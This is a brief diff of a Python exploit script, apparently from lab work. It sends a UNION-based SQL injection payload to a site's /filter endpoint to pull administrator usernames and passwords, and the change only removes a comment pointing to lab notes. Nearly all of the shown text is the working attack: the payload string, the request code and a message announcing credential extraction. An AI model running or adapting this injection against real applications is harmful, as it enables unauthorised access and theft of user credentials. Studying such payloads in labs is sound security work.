@@ -9,7 +9,7 @@ session = requests.Session()
 
 print("[+] Extracting administrator credentials...")
 
-payload = "' UNION SELECT username, password FROM users--"  # See the payloads in the lab-notes
+payload = "' UNION SELECT username, password FROM users--"
 
 response = session.get(
     BASE_URL + "/filter",
